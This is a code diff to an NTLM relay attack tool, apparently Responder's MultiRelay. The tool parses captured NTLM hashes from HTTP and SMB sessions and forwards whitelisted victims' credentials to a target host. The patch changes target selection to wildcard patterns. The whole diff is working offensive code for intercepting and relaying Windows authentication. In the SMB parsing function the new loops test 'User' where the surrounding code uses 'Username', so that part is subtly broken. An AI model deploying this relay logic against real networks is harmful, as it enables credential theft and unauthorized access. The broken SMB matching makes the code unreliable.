@@ -24,6 +24,7 @@ import re
 import datetime
 import threading
 import uuid
+import fnmatch
 from RelayMultiPackets import *
 from odict import OrderedDict
 from base64 import b64decode, b64encode
@@ -100,15 +101,15 @@ def IsSMBAnonymous(data):
     else:
        return False
 
-def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
+def ParseHTTPHash(data, key, client, UsersToRelay, Host, Pivoting):
 	LMhashLen    = struct.unpack('<H',data[12:14])[0]
 	LMhashOffset = struct.unpack('<H',data[16:18])[0]
 	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
-	
+
 	NthashLen    = struct.unpack('<H',data[20:22])[0]
 	NthashOffset = struct.unpack('<H',data[24:26])[0]
 	NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-	
+
 	UserLen      = struct.unpack('<H',data[36:38])[0]
 	UserOffset   = struct.unpack('<H',data[40:42])[0]
 	User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')
@@ -130,18 +131,21 @@ def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
                    else:
                       print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
 
-                if User in UserToRelay or "ALL" in UserToRelay:
-                        if Pivoting[0] == "1":
-                           return User, Domain
-                        print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
-                        if ReadData("SMBRelay-Session.txt", client, User, HostName, Host, cmd=None):
-                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
-                           return None, None
-                        else:
-                	   return User, HostName
-                else:
-                        print "[+] Username: %s not in target list, dropping connection."%(User)
-                	return None, None
+                UTRmatched = False
+                for UTR in UsersToRelay:
+                   if fnmatch.fnmatch(User,UTR):
+                           UTRmatched = True
+                           if Pivoting[0] == "1":
+                              return User, Domain
+                           print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
+                           if ReadData("SMBRelay-Session.txt", client, User, HostName, Host, cmd=None):
+                              ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
+                              return None, None
+                           else:
+                   	          return User, HostName
+                if not UTRmatched:
+                   print "[+] Username: %s not in target list, dropping connection."%(User)
+                   return None, None
 
 	if NthashLen > 24:
 		DomainLen      = struct.unpack('<H',data[28:30])[0]
@@ -162,23 +166,28 @@ def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
                       pass
                    else:
                       print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
-                if User in UserToRelay or "ALL" in UserToRelay:
-                        if Pivoting[0] == "1":
-                           return User, Domain
 
-                        print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
+                UTRmatched = False
+                for UTR in UsersToRelay:
+                    if fnmatch.fnmatch(User,UTR):
+                           UTRmatched = True
 
-                        if ReadData("SMBRelay-Session.txt", client, User, Domain, Host, cmd=None):
-                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
-                           return None, None
-                        else:
-                	   return User, Domain
-                else:
-                        print "[+] Username: %s not in target list, dropping connection."%(User)
-                	return None, None
+                           if Pivoting[0] == "1":
+                              return User, Domain
+
+                           print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
+
+                           if ReadData("SMBRelay-Session.txt", client, User, Domain, Host, cmd=None):
+                              ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
+                              return None, None
+                           else:
+                   	          return User, Domain
+                if not UTRmatched:
+                   print "[+] Username: %s not in target list, dropping connection."%(User)
+                   return None, None
 
 
-def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB NTLMSSP v1/v2
+def ParseSMBHash(data,client, challenge,UsersToRelay,Host,Pivoting):  #Parse SMB NTLMSSP v1/v2
         SSPIStart  = data.find('NTLMSSP')
         SSPIString = data[SSPIStart:]
 	LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
@@ -207,19 +216,23 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB 
                       pass
                    else:
                       print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
-                if Username in UserToRelay or "ALL" in UserToRelay:
-                        if Pivoting[0] == "1":
-                           return Username, Domain
 
-                        print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
-                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
-                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
-                           return None, None
-                        else:
-                	   return Username, Domain
-                else:
-                        print "[+] Username: %s not in target list, dropping connection."%(Username)
-                	return None, None
+                UTRmatched = False
+                for UTR in UsersToRelay:
+                   if fnmatch.fnmatch(User,UTR):
+                           UTRmatched = True
+                           if Pivoting[0] == "1":
+                              return Username, Domain
+   
+                           print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
+                           if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
+                              ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
+                              return None, None
+                           else:
+                   	          return Username, Domain
+                if not UTRmatched:
+                   print "[+] Username: %s not in target list, dropping connection."%(Username)
+                   return None, None
 
 	if NthashLen > 60:
 		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
@@ -241,18 +254,22 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB 
                       pass
                    else:
                       print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
-                if Username in UserToRelay or "ALL" in UserToRelay:
-                        if Pivoting[0] == "1":
-                           return Username, Domain
-                        print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
-                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
-                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
-                           return None, None
-                        else:
-                	   return Username, Domain
-                else:
-                        print "[+] Username: %s not in target list, dropping connection."%(Username)
-                	return None, None
+
+                UTRmatched = False
+                for UTR in UsersToRelay:
+                    if fnmatch.fnmatch(User,UTR):
+                           UTRmatched = True
+                           if Pivoting[0] == "1":
+                              return Username, Domain
+                           print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
+                           if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
+                              ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
+                              return None, None
+                           else:
+                   	          return Username, Domain
+                if not UTRmatched:
+                   print "[+] Username: %s not in target list, dropping connection."%(Username)
+                   return None, None
 
 #Get the index of the dialect we want. That is NT LM 0.12.
 def Parse_Nego_Dialect(data):
